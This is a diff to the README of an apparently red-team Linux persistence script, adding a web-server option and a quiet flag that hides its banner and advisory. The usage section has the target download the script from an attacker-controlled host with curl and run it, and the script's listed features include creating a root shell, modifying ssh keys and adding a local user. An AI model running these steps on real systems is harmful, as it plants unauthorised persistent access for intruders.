@@ -7,30 +7,30 @@ Available parts:
 - Create a root shell
 - Modify ssh keys
 - Create local user
+- Serve a local web server
 
 ## Usage
 
 ```sh
 # From github
-curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/lin-persistence.sh
-sh lin-persistence.sh -h
+curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/persistence.sh
+sh persistence.sh -h
 ```
 ```sh
 # Local network
 # Host:
-python -m SimpleHTTPServer 8000 #or
-python3 -m http.server 8000
+sh persistence.sh -w
 # Target:
-curl -LJO <Host>:8000/lin-persistence.sh
-sh lin-persistence.sh -h
+curl -LJO <Host>:8000/persistence.sh
+sh persistence.sh -h
 ```
 
 ### Parameters
 
 ```sh
-sh lin-persistence.sh -h
+sh persistence.sh -h
 
-Usage: sh lin-persistence.sh [-h/-?] [-e] [-r] [-s] [-u] [-p]
+Usage: sh persistence.sh [-h/-?] [-e] [-r] [-s] [-u] [-p] [-w] [-q]
 
 -h/-?
   Show this help message
@@ -54,6 +54,12 @@ Usage: sh lin-persistence.sh [-h/-?] [-e] [-r] [-s] [-u] [-p]
   Set this password to new user
   Only useful in combination with -u parameter
   Root needed!
+
+-w
+  Serves an local web server for transferring files
+
+-q
+  Quiet. No banner and no advisory displayed
 ```
 
 ## Results
